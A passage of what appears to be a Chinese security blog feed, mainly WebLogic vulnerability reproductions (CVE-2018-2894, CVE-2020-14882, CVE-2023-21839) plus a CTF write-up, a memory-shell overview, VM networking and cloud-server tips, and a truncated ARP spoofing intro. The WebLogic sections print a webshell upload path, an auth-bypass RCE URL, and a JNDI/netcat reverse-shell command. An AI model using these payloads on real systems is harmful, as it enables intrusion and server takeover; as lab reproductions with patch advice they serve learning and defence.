title="1、漏洞原因"></a>1、漏洞原因</h3><p>Weblogic管理端未授权的两个页面存在任意上传jsp文件漏洞，进而获取服务器权限。</p><p>CVE-2018-2894漏洞是由于WebLogic Server中的Web Service Test Page存在任意文件上传的缺陷。在“生产模式”下，默认不开启Web Service Test Page，因此该漏洞的利用存在一定限制。攻击者可以利用该漏洞上传任意JSP文件，进而可能获取服务器权限。</p><h3 id="2、漏洞影响-2"><a href="#2、漏洞影响-2" class="headerlink" title="2、漏洞影响"></a>2、漏洞影响</h3><p>利用CVE-2018-2894漏洞，攻击者可以上传恶意的JSP文件到服务器，这些文件可以作为webshell使用，允许攻击者远程执行代码，从而控制服务器。</p><h3 id="3、漏洞涉及版本-2"><a href="#3、漏洞涉及版本-2" class="headerlink" title="3、漏洞涉及版本"></a>3、漏洞涉及版本</h3><ol><li>Oracle WebLogic Server 10.3.6.0</li><li>Oracle WebLogic Server 12.1.3.0</li><li>Oracle WebLogic Server 12.2.1.2</li><li>Oracle WebLogic Server 12.2.1.3</li></ol><h3 id="4、漏洞复现-2"><a href="#4、漏洞复现-2" class="headerlink" title="4、漏洞复现"></a>4、漏洞复现</h3><p>1、未授权访问<code>/ws_utc/config.do</code>页面</p><p><img src="/img/VulnRep-WebLogic/image-20240516181742024.png" alt="image-20240516181742024"></p><p>由于在“生产模式”下，默认不开启Web Service Test Page，所以此处需要我们手动通过管理员登陆后台去开启。先看一下管理员账号密码：<code>weblogic: TvrG557m</code></p><p><img src="/img/VulnRep-WebLogic/image-20240516182023018.png" alt="image-20240516182023018"></p><p>2、在<code>/console</code>登录后台</p><p><img src="/img/VulnRep-WebLogic/image-20240516182201233.png" alt="image-20240516182201233"></p><p>3、在域结构中展开高级选项</p><p><img src="/img/VulnRep-WebLogic/image-20240517164549660.png" alt="image-20240517164549660"></p><p>勾选<code>启用Web服务测试页</code>后保存</p><p><img src="/img/VulnRep-WebLogic/image-20240517164637306.png" alt="image-20240517164637306"></p><p>4、回到未授权访问<code>/ws_utc/config.do</code>页面</p><p>将<code>当前的工作目录</code>修改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure><p>5、提交后来到安全，添加文件</p><p><img src="/img/VulnRep-WebLogic/image-20240517172013119.png" alt="image-20240517172013119"></p><p>提交webshell，BP拦截，在响应包的最下面找到对应的时间戳</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx:7001/ws_utc/css/config/keystore/时间戳_22.jsp</span><br></pre></td></tr></table></figure><p>即可连接成功</p><h3 id="5、漏洞修复-2"><a href="#5、漏洞修复-2" class="headerlink" title="5、漏洞修复"></a>5、漏洞修复</h3><ol><li>设置访问权限：确保 config.do 和 begin.do 页面在登录授权后才能访问，以防止未授权的文件上传尝试。</li><li>使用安全产品：考虑在入侵防御系统（IPS）等安全产品中加入相应的特征，以帮助检测和阻止利用此漏洞的尝试。</li><li>升级到最新版本：安装 Oracle 官方提供的最新补丁，以修复已知的安全漏洞。</li></ol><h2 id="五、WebLogic未授权命令执行漏洞（CVE-2020-14882）"><a href="#五、WebLogic未授权命令执行漏洞（CVE-2020-14882）" class="headerlink" title="五、WebLogic未授权命令执行漏洞（CVE-2020-14882）"></a>五、WebLogic未授权命令执行漏洞（CVE-2020-14882）</h2><h3 id="1、漏洞原因-3"><a href="#1、漏洞原因-3" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>CVE-2020-14882 漏洞是由于 Oracle WebLogic Server Console 中存在路径遍历漏洞，允许攻击者构造特殊的 HTTP 请求来绕过身份验证，从而访问并修改管理员控制台的某些资源。这可能导致远程代码执行（RCE）。</p><h3 id="2、漏洞影响-3"><a href="#2、漏洞影响-3" class="headerlink" title="2、漏洞影响"></a>2、漏洞影响</h3><ul><li>远程代码执行：攻击者可以在目标系统上执行任意代码，导致服务器被完全控制。</li><li>未经身份验证的访问：攻击者无需进行身份验证即可利用此漏洞。</li></ul><h3 id="3、漏洞涉及版本-3"><a href="#3、漏洞涉及版本-3" class="headerlink" title="3、漏洞涉及版本"></a>3、漏洞涉及版本</h3><ol><li>Oracle Weblogic Server 10.3.6.0.0</li><li>Oracle Weblogic Server 12.1.3.0.0</li><li>Oracle Weblogic Server 12.2.1.3.0</li><li>Oracle Weblogic Server 12.2.1.4.0</li><li>Oracle Weblogic Server 14.1.1.0.0</li></ol><h3 id="4、漏洞复现-3"><a href="#4、漏洞复现-3" class="headerlink" title="4、漏洞复现"></a>4、漏洞复现</h3><p>1、<code>http://xxx.xxx/console</code>这里是登录页面</p><p><img src="/img/VulnRep-WebLogic/image-20240517174515867.png" alt="image-20240517174515867"></p><p>2、构造poc未授权访问后台地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=AppDeploymentsControlPage&amp;handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-WebLogic/image-20240517175322311.png" alt="image-20240517175322311"></p><p>3、构造POC执行RCE</p><p>创建<code>/tmp/1.txt</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.136:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20/tmp/1.txt%27);%22)</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-WebLogic/image-20240517183753482.png" alt="image-20240517183753482"></p><p>进入容器查看，创建成功</p><h3 id="5、漏洞修复-3"><a href="#5、漏洞修复-3" class="headerlink" title="5、漏洞修复"></a>5、漏洞修复</h3><p>安装官方最新补丁进行升级：<a href="https://www.oracle.com/security-alerts/cpuapr2020.html">https://www.oracle.com/security-alerts/cpuapr2020.html</a></p><h2 id="六、Weblogic-远程代码执行漏洞（CVE-2023-21839）"><a href="#六、Weblogic-远程代码执行漏洞（CVE-2023-21839）" class="headerlink" title="六、Weblogic 远程代码执行漏洞（CVE 2023-21839）"></a>六、Weblogic 远程代码执行漏洞（CVE 2023-21839）</h2><h3 id="1、漏洞原因-4"><a href="#1、漏洞原因-4" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>WebLogic 存在远程代码执行漏洞（CVE-2023-21839&#x2F;CNVD-2023-04389），由于Weblogic IIOP&#x2F;T3协议存在缺陷，当IIOP&#x2F;T3协议开启时，允许未经身份验证的攻击者通过IIOP&#x2F;T3协议网络访问攻击存在安全风险的WebLogic Server。该漏洞涉及到 JNDI 注入，当 JDK 版本过低或者本地存在小工具时，可能导致远程代码执行。</p><h3 id="2、漏洞影响-4"><a href="#2、漏洞影响-4" class="headerlink" title="2、漏洞影响"></a>2、漏洞影响</h3><p>风险等级：奇安信 CERT 将此漏洞的风险等级评定为 “高危”，并给出了 CVSS 3.1 评分为 8.6。</p><h3 id="3、漏洞涉及版本-4"><a href="#3、漏洞涉及版本-4" class="headerlink" title="3、漏洞涉及版本"></a>3、漏洞涉及版本</h3><p>该漏洞影响以下版本的 Oracle WebLogic Server：</p><ol><li>Oracle WebLogic Server 10.3.6.0</li><li>Oracle WebLogic Server 12.2.1.2.0</li><li>Oracle WebLogic Server 12.2.1.1.0</li><li>Oracle WebLogic Server 12.2.1.3.0</li><li>Oracle WebLogic Server 12.2.1.0.0</li><li>Oracle WebLogic Server 12.2.1.4.0</li><li>Oracle WebLogic Server 14.1.1.0.0</li><li>Oracle WebLogic Server 12.1.2.0.0</li><li>Oracle WebLogic Server 12.1.3.0.0</li></ol><h3 id="4、漏洞复现-4"><a href="#4、漏洞复现-4" class="headerlink" title="4、漏洞复现"></a>4、漏洞复现</h3><p>1、使用nmap 探测有无开启T3协议</p><p><img src="/img/VulnRep-WebLogic/image-20240518150255335.png" alt="image-20240518150255335"></p><p>2、在这里使用POC</p><p>地址：<a href="https://github.com/4ra1n/CVE-2023-21839">https://github.com/4ra1n/CVE-2023-21839</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/4ra1n/CVE-2023-21839</span><br></pre></td></tr></table></figure><p>之后对main.go 进行编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd cmd</span><br><span class="line">sudo apt install gccgo-go//安装go语言</span><br><span class="line">go build -o CVE-2023-21839</span><br></pre></td></tr></table></figure><p>3、开启监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//1、开启JNDI 监听</span><br><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.126.130</span><br><span class="line">//2、开启NC监听</span><br><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure><p>4、触发漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./CVE-2023-21839 -ip 192.168.126.128 -port 7001 -ldap ldap://192.168.126.130:1389/Basic/ReverseShell/192.168.126.130/1234</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-WebLogic/image-20240518153723.png" alt="image-20240518153723.png"></p><p>获取shell</p><h3 id="5、漏洞修复-4"><a href="#5、漏洞修复-4" class="headerlink" title="5、漏洞修复"></a>5、漏洞修复</h3><p>1、Oracle 在 2023 年 1 月的安全公告中修复了这个漏洞，补丁下载链接：<a href="https://support.oracle.com/rs?type=doc&id=2917213.2">https://support.oracle.com/rs?type=doc&amp;id=2917213.2</a></p><p>2、缓解方式：禁用 T3 及 IIOP</p>]]></content>
      
      
      <categories>
          
          <category> 复现与审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebLogic系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CTF竞赛】[NISACTF 2022]checkin—看不见的字符</title>
      <link href="/2024/05/17/CTF-competition-Invisible-characters/"/>
      <url>/2024/05/17/CTF-competition-Invisible-characters/</url>
      
        <content type="html"><![CDATA[<h1 id="【CTF竞赛】-NISACTF-2022-checkin—看不见的字符"><a href="#【CTF竞赛】-NISACTF-2022-checkin—看不见的字符" class="headerlink" title="【CTF竞赛】[NISACTF 2022]checkin—看不见的字符"></a>【CTF竞赛】[NISACTF 2022]checkin—看不见的字符</h1><h2 id="一、看题"><a href="#一、看题" class="headerlink" title="一、看题"></a>一、看题</h2><p>当我们复制的时候会变成这样</p><p><img src="/img/CTF-competition-Invisible-characters/image-20240517210427329.png" alt="image-20240517210427329"></p><p>把这个代码全部复制粘贴到php文件中去，发现有好多奇怪的字符导致我们不能以正常思路去看待代码</p><p><img src="/img/CTF-competition-Invisible-characters/image-20240517210613255.png" alt="image-20240517210613255"></p><h2 id="二、解题"><a href="#二、解题" class="headerlink" title="二、解题"></a>二、解题</h2><h3 id="1、获取参数名"><a href="#1、获取参数名" class="headerlink" title="1、获取参数名"></a>1、获取参数名</h3><p>将PHP文件到 010 或者 WinHex 中打开</p><p>复制我们需要数据的十六进制代码，如：我们需要知道GET接收的参数名到底是谁</p><p><img src="/img/CTF-competition-Invisible-characters/image-20240517210814023.png" alt="image-20240517210814023"></p><p>在十六进制的前面都加上一个%，就是我们需要要提交的参数名了</p><p><img src="/img/CTF-competition-Invisible-characters/image-20240517211213521.png" alt="image-20240517211213521"></p><h3 id="2、获取参数值"><a href="#2、获取参数值" class="headerlink" title="2、获取参数值"></a>2、获取参数值</h3><p>同样的方法获取需要的参数值</p><p><img src="/img/CTF-competition-Invisible-characters/image-20240517211626414.png" alt="image-20240517211626414"></p><p><img src="/img/CTF-competition-Invisible-characters/image-20240517211615280.png" alt="image-20240517211615280"></p><h3 id="3、传参"><a href="#3、传参" class="headerlink" title="3、传参"></a>3、传参</h3><p>结合起来加上前面的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6%55%67%65%69%77%6F%E2%81%A9%E2%81%A6%63%75%69%73%68%69%79%75%61%6E=%E2%80%AE%E2%81%A6%20%46%6C%61%67%21%E2%81%A9%E2%81%A6%4E%31%53%41%43%54%46</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【基础知识】简述虚拟机的三种网络连接模式</title>
      <link href="/2024/05/11/Nouns-Virtual-Machine-Network/"/>
      <url>/2024/05/11/Nouns-Virtual-Machine-Network/</url>
      
        <content type="html"><![CDATA[<h1 id="【基础知识】简述虚拟机的三种网络连接模式"><a href="#【基础知识】简述虚拟机的三种网络连接模式" class="headerlink" title="【基础知识】简述虚拟机的三种网络连接模式"></a>【基础知识】简述虚拟机的三种网络连接模式</h1><p>网络安全中，虚拟机是必不可少的存在，了解虚拟机的网络连接模式是很有必要的。但网上对此的讲解过于繁琐和难以理解，在此用图和简短的语句写下本人的理解，以帮助刚入行的同学快速掌握。</p><h2 id="一、桥接模式"><a href="#一、桥接模式" class="headerlink" title="一、桥接模式"></a>一、桥接模式</h2><p>类似虚拟出来一个交换机（Vmnet0），同时把物理主机和所有的桥接虚拟机都插在这个交换机中，此时桥接模式的虚拟机和主机同处一个网段且子网掩码、网关与DNS都与主机一模一样。</p><p>看如图：</p><p><img src="/img/Nouns-Virtual-Machine-Network/%E8%99%9A%E6%8B%9F%E6%9C%BA-%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F.png" alt="虚拟机-桥接模式"></p><p>简而言之：桥接类型的虚拟机和主机一起同处一个局域网中，与主机使用的相同的网卡、子网掩码、网关、DNS。此时，主机可以访问互联网，虚拟机也可以访问到互联网。</p><h2 id="二、NAT模式"><a href="#二、NAT模式" class="headerlink" title="二、NAT模式"></a>二、NAT模式</h2><p>相当于NAT模式的虚拟机是连接在交互机（Vmnet8）上面的，而主机的VMWare Network Adapter Vmnet8也会连接到Vmnet8，用来主机跟NAT虚拟机通讯；此时NAT虚拟机可以通过宿主主机所在的网络访问互联网、以及宿主主机能访问到的一切网络。</p><p>看如图：</p><p><img src="/img/Nouns-Virtual-Machine-Network/%E8%99%9A%E6%8B%9F%E6%9C%BA-NAT%E6%A8%A1%E5%BC%8F.png" alt="虚拟机-NAT模式"></p><p>简而言之：NAT类型的虚拟机使用的是主机的网卡，可以来理解为“主机肚子里的蛔虫”。此时，主机如何上网，虚拟机就如何上网，主机能访问到的机器，虚拟机也能访问的到。但是主机之外的其他机器是不能访问到NAT机器的。</p><h2 id="三、仅主机模式"><a href="#三、仅主机模式" class="headerlink" title="三、仅主机模式"></a>三、仅主机模式</h2><p>与NAT模式差不多，但是是使用VMware Network Adapter VMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，且与外网隔离，不能上网，使仅主机模式的虚拟机成为被外界隔离的主机。当然，此时除了主机能访问到之外，NAT利用主机能访问的机器也能访问到的特性，也是可以访问仅主机机器的；但是仅主机机器是访问不到NAT虚拟机的。</p><p>看如图：</p><p><img src="/img/Nouns-Virtual-Machine-Network/%E8%99%9A%E6%8B%9F%E6%9C%BA-%E4%BB%85%E4%B8%BB%E6%9C%BA%E6%A8%A1%E5%BC%8F.png" alt="虚拟机-仅主机模式"></p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机网络连接模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内存马】JavaWeb 内存马初识与检测</title>
      <link href="/2024/04/29/Red-Team-Invasion-Memory-Horse/"/>
      <url>/2024/04/29/Red-Team-Invasion-Memory-Horse/</url>
      
        <content type="html"><![CDATA[<h1 id="【内存马】JavaWeb-内存马初识与检测"><a href="#【内存马】JavaWeb-内存马初识与检测" class="headerlink" title="【内存马】JavaWeb 内存马初识与检测"></a>【内存马】JavaWeb 内存马初识与检测</h1><h1 id="一、内存马初识"><a href="#一、内存马初识" class="headerlink" title="一、内存马初识"></a>一、内存马初识</h1><p>随着攻防演练越演越烈，流量分析、EDR、WAF、防护软件等越来越多的设备被广泛使用，传统的基于文件上传式的webshell 已经越来越容易被检测到，在这些安全设备面前几乎无处遁形。</p><p>Webshell内存马，是在内存中写入恶意后门和木马并执行，达到远程控制Web服务器的一类内存马，采用无文件的方法直接注入到内存中，控制服务器。不需要依赖于文件，从而躲避杀软，给检测带来巨大的难度。</p><h1 id="二、内存马的分类"><a href="#二、内存马的分类" class="headerlink" title="二、内存马的分类"></a>二、内存马的分类</h1><ol><li>Servlet型内存马：Servlet、Filter、Listener</li><li>框架类型内存马：Spring Controller、Interceptor</li><li>Agent类型内存马</li><li>其他……</li></ol><h1 id="三、Servlet-类型"><a href="#三、Servlet-类型" class="headerlink" title="三、Servlet 类型"></a>三、Servlet 类型</h1><h2 id="1、Java-Web-三大组件介绍"><a href="#1、Java-Web-三大组件介绍" class="headerlink" title="1、Java Web 三大组件介绍"></a>1、Java Web 三大组件介绍</h2><p>Servlet、Filter、Listener 是JavaWeb 的三大组件，有关这三个组件如下进行简单的说明：</p><ol><li>Servlet：处理http 请求的业务逻辑。</li><li>Filter：对http的请求进行过滤，如敏感字符等。过滤完请求后再把请求转交给Servlet。</li><li>Listener：Javaweb中的监听器，如监听在线的用户访问量，统计网站的总访问量等。</li></ol><h2 id="2、三大组件的运行顺序"><a href="#2、三大组件的运行顺序" class="headerlink" title="2、三大组件的运行顺序"></a>2、三大组件的运行顺序</h2><p>当Javaweb 运行起来之后，Listener 最先进行监听直到Javaweb 停止运行，之后当有http请求的话，Filter 会对请求进行脱敏，再将请求转交给Servlet，Servlet处理完请求之后，响应再次来到Filter脱敏，之后返回给客户端。</p><h2 id="3、内存马的原理"><a href="#3、内存马的原理" class="headerlink" title="3、内存马的原理"></a>3、内存马的原理</h2><p>Servlet 类型的内存马的原理大同小异，其都会通过getServletContext() 函数获取”context“ 的属性值，并设置可修改的属性。之后定义filter 过滤器，拦截请求，检测请求参数中是否有木马参数，如cmd，若有，则执行木马命令，没有则正常放行。</p><h1 id="四、Spring-类型"><a href="#四、Spring-类型" class="headerlink" title="四、Spring 类型"></a>四、Spring 类型</h1><h2 id="1、Sprint小谈"><a href="#1、Sprint小谈" class="headerlink" title="1、Sprint小谈"></a>1、Sprint小谈</h2><p>Spring 可以简单看作是把Javaweb三大组件结合起来的框架，使用MVC架构 （Model、View、Controller）。此架构中HTTP 的最终请求是在Controller 中实现。</p><h2 id="2、Spring内存马"><a href="#2、Spring内存马" class="headerlink" title="2、Spring内存马"></a>2、Spring内存马</h2><p>跟Servlet 类型的差不多，都是拿到”context“ 的属性值，并动态的添加一个Controller，之后映射到内存地址，获取请求参数实现恶意代码，并做命令回显。</p><h2 id="3、Spring隐形马"><a href="#3、Spring隐形马" class="headerlink" title="3、Spring隐形马"></a>3、Spring隐形马</h2><p>隐形马又叫劫持马，原理跟dll 劫持差不多，都是通过对一个白名单的类进行劫持，从而执行恶意代码。</p><p>在以上内存马中，是通过在内存马中注册一个新的类来实现的，依然是有办法遍历内存中的类来实现查杀。但是隐形马是通过劫持了白名单的类，这样将大大增加查杀的难度。</p><h1 id="五、Agent-类型"><a href="#五、Agent-类型" class="headerlink" title="五、Agent 类型"></a>五、Agent 类型</h1><h2 id="1、Agent-技术示例"><a href="#1、Agent-技术示例" class="headerlink" title="1、Agent 技术示例"></a>1、Agent 技术示例</h2><p>简单而言，Agent 技术允许我们去读取、修改内存中的数据，多用于调试修改等，比如：</p><ul><li>某种编辑器的调试功能，典型如IDA、OD、JetBrains编程开发系列等</li><li>某些软件破解工具，就是修改了内存中的数据</li><li>RASP技术：火线动态IAST（植入运行程序当中，可以深入内存马中检测）</li></ul><h2 id="2、Agent-内存马"><a href="#2、Agent-内存马" class="headerlink" title="2、Agent 内存马"></a>2、Agent 内存马</h2><p>其原理就是深入服务器计算机内存，把一个正常的正在运行的类修改成恶意类</p><h1 id="六、内存马的查杀"><a href="#六、内存马的查杀" class="headerlink" title="六、内存马的查杀"></a>六、内存马的查杀</h1><h2 id="1、内存马的检测"><a href="#1、内存马的检测" class="headerlink" title="1、内存马的检测"></a>1、内存马的检测</h2><p>在java 中，只有在JVM中被加载后的类才能调用执行，因此，内存马的检测需要去内存中排查。</p><p>Java提供了Instrumentation 类来实现运行中注入代码执行，可以通过这个类遍历内存中的class字节码，并反编译成java 代码，进行webshell 检测。</p><h2 id="2、内存马的排查"><a href="#2、内存马的排查" class="headerlink" title="2、内存马的排查"></a>2、内存马的排查</h2><p>虽然内存马运行在内存中，需要特定的手段去查杀，但是其访问的方式跟普通木马无异，都是需要通过URL传递命令执行。可以根据日志中用户的请求路径和参数、已经响应状态码和相应内容进行筛选，以判断是否被注入内存马。</p>]]></content>
      
      
      <categories>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【其他经验】阿里云服务器免费领取</title>
      <link href="/2024/04/20/Extracurricular-experience-aliyun/"/>
      <url>/2024/04/20/Extracurricular-experience-aliyun/</url>
      
        <content type="html"><![CDATA[<h1 id="【其他经验】阿里云服务器免费领取"><a href="#【其他经验】阿里云服务器免费领取" class="headerlink" title="【其他经验】阿里云服务器免费领取"></a>【其他经验】阿里云服务器免费领取</h1><h1 id="一、阿里云云服务器领取"><a href="#一、阿里云云服务器领取" class="headerlink" title="一、阿里云云服务器领取"></a>一、阿里云云服务器领取</h1><h2 id="一、阿里云7月免费云服务器领取（目前失效）"><a href="#一、阿里云7月免费云服务器领取（目前失效）" class="headerlink" title="一、阿里云7月免费云服务器领取（目前失效）"></a>一、阿里云7月免费云服务器领取（目前失效）</h2><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>只要是在校大学生（不分年龄专业）都有一台免费的7个月限期的阿里云服务器。那么如果你是多个人的话，岂不是有永久免费的服务器了？</p><h3 id="二、领取地址"><a href="#二、领取地址" class="headerlink" title="二、领取地址"></a>二、领取地址</h3><p>领取地址：<a href="https://developer.aliyun.com/plan/student">https://developer.aliyun.com/plan/student</a></p><p><img src="/img/Extracurricular-experience-aliyun/image-20240420211657642.png" alt="image-20240420211657642"></p><p>在②的前三个即可领取服务器，后两个即可以续航6个月。</p><h3 id="三、领取一个月的机器"><a href="#三、领取一个月的机器" class="headerlink" title="三、领取一个月的机器"></a>三、领取一个月的机器</h3><p><img src="/img/Extracurricular-experience-aliyun/image-20240420211931740.png" alt="image-20240420211931740"></p><p>需要注册【阿里云】账户，然后在【支付宝】中完成学生认证，就可以领取了，阿里云的账号密码一定要记住</p><p>领取机器时的注意事项：</p><ol><li>我们只能选择机器操作系统的类型（如Debian、Centos、Windows Server等）。那么个人建议选择linux操作系统，如果linux一点都不懂，也不计划在未来接触的话，选择windows server机器。操作系统的版本信息建议选择最新版即可。</li><li>对于其他的一概不能选择（如机器的磁盘大小、带宽大小等，一般都是2CPU 2bit的）</li><li>这里的支付都是0元，不需要扫码支付，点击支付即可成，支付成功之后会出现【管理台】，点击进入管理台</li><li><strong>注意：</strong>个人建议【管理台】的URL地址请保存收藏起来，以免找不到</li><li>这样，就领取成功了</li></ol><h3 id="四、续航六个月"><a href="#四、续航六个月" class="headerlink" title="四、续航六个月"></a>四、续航六个月</h3><p><img src="/img/Extracurricular-experience-aliyun/image-20240420212549691.png" alt="image-20240420212549691"></p><p>需要进行【实验和认证】，这个实验就是练习对云服务器的操作和使用，这里我就不一步步细说了，到时候跟着指示多实操几遍，一遍没搞懂多搞几遍，毕竟以后会一直用。</p><p>稍微说一下：</p><ol><li>印象中有两个项目，都有一个小考核，考核内容和实验内容基本一模一样</li><li>考核过去之后会有电子证书，也是一份荣誉，可以下载收藏起来，要当场下载收藏，别找不到了</li><li>考核过后就可以回来领取续航了</li><li>之后根据续航的提示，给服务器续航六个月。这里，一定要续航六个月，其他时间的话好像是需要付费的。</li><li>之后就搞完了，也可以用xshell 去链接云服务器，会方便很多</li></ol><h2 id="二、高校学生免费3月服务器领取（免费额度300元）"><a href="#二、高校学生免费3月服务器领取（免费额度300元）" class="headerlink" title="二、高校学生免费3月服务器领取（免费额度300元）"></a>二、高校学生免费3月服务器领取（免费额度300元）</h2><p>领取地址：<a href="https://edu.aliyun.com/campus?spm=5176.28623341.J_jkwocrVeAsFNBaE5pOhOZ.1.61d14519RxxQAc">https://edu.aliyun.com/campus?spm=5176.28623341.J_jkwocrVeAsFNBaE5pOhOZ.1.61d14519RxxQAc</a></p><p>在这个页面下方有学习权益，存在云服务器ECS免费使用三个月，配300元免费额度。需要学生实名认证。</p><p>简而言之，是一个限时限量限身份的云服务器</p><h1 id="二、华为云-免费-36元1年-服务器领取"><a href="#二、华为云-免费-36元1年-服务器领取" class="headerlink" title="二、华为云 免费&#x2F;36元1年 服务器领取"></a>二、华为云 免费&#x2F;36元1年 服务器领取</h1><h2 id="一、前言-1"><a href="#一、前言-1" class="headerlink" title="一、前言"></a>一、前言</h2><p>华为云有多处免费领取服务器的方法，这里一一分享。而且不管是 免费还是 36元&#x2F;1年 都是挺划算的，而且是2核2G，规格都很不错。</p><h2 id="二、每日限时体验免费服务器"><a href="#二、每日限时体验免费服务器" class="headerlink" title="二、每日限时体验免费服务器"></a>二、每日限时体验免费服务器</h2><p>这是一个活动，截至时间不清楚</p><ul><li><p><strong>活动时间</strong></p><p>带有“每日限量”标签产品 9:30 开放领取，其他产品每天0点开放领取，云产品体验名额有限，领完即止。</p></li><li><p><strong>参与对象</strong></p><p>有一定的要求，大致看了一下，新人用户完全符合</p></li></ul><p>领取地址：<a href="https://activity.huaweicloud.com/free_test/index.html?utm_source=special&utm_medium=organic&utm_adplace=ecs-free-ty-xsms_guanggao2">https://activity.huaweicloud.com/free_test/index.html?utm_source=special&amp;utm_medium=organic&amp;utm_adplace=ecs-free-ty-xsms_guanggao2</a></p><h2 id="三、36元-1年-服务器购买"><a href="#三、36元-1年-服务器购买" class="headerlink" title="三、36元&#x2F;1年 服务器购买"></a>三、36元&#x2F;1年 服务器购买</h2><p>购买地址依然是这里：<a href="https://activity.huaweicloud.com/free_test/index.html?utm_source=special&utm_medium=organic&utm_adplace=ecs-free-ty-xsms_guanggao2">https://activity.huaweicloud.com/free_test/index.html?utm_source=special&amp;utm_medium=organic&amp;utm_adplace=ecs-free-ty-xsms_guanggao2</a></p><p>属于 2核2G，也是非常不错的，可以先提前免费体验一个月</p>]]></content>
      
      
      <categories>
          
          <category> 其他经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阿里云 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【红队入侵】ARP欺骗攻击与防御</title>
      <link href="/2024/04/18/Red-Team-Invasion-ARP/"/>
      <url>/2024/04/18/Red-Team-Invasion-ARP/</url>
      
        <content type="html"><![CDATA[<h1 id="【红队入侵】ARP欺骗攻击与防御"><a href="#【红队入侵】ARP欺骗攻击与防御" class="headerlink" title="【红队入侵】ARP欺骗攻击与防御"></a>【红队入侵】ARP欺骗攻击与防御</h1><h2 id="一、ARP原理"><a href="#一、ARP原理" class="headerlink" title="一、ARP原理"></a>一、ARP原理</h2><h3 id="1、ARP一些操作："><a href="#1、ARP一些操作：" class="headerlink" title="1、ARP一些操作："></a>1、ARP一些操作：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arp查看：arp -a命令</span><br><span class="line">arp删除：arp -d <span class="number">139.35</span>.<span class="number">255.255</span></span><br><span class="line">tcp抓取模块网卡的所有arp请求：tcpdump -i eth0 -nn arp<span class="comment">//eth0是名卡的名称。</span></span><br><span class="line">tcp抓取指定ip 的请求：tcpdump -i eth0 -nn arp <span class="keyword">and</span> host IP</span><br></pre></td></tr></table></figure><h3 id="2、ARP协议工作原理"><a href="#2、ARP协议工作原理" class="headerlink" title="2、ARP协议工作原理"></a>2、ARP协议工作原理</h3><ol><li><strong>什么是ARP：</strong>地址解析原理：即ARP，是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。</li><li><strong>工作原理：</strong>ARP协议规定，每一台极端及都需要一个ARP表，用来保存IP地址和MAC地址的映射关系。<br>访问IP地址的时候就去查ARP表，从而找到对应的MAC地址。<br>如果ARP表中匹配不到，就会使用广播的方式发送一个ARP请求 ，目标主机收到请求之后会使用单播的方式返回一个ARP相应，告知自己的MAC地址 。<br>拿到MAC地址后，会将映射关系缓存到ARP表，而后传输数据到数据链路层进行解析转换。</li><li><strong>ARP协议的作用：</strong>网络中的数据传输所依赖的是MAC地址而不是IP地址，ARP协议负责将IP地址转换为MAC地址。ARP协议的主要工作是就是建立、查询、更新、删除ARP表项。</li><li><strong>ARP查看：</strong><code>arp 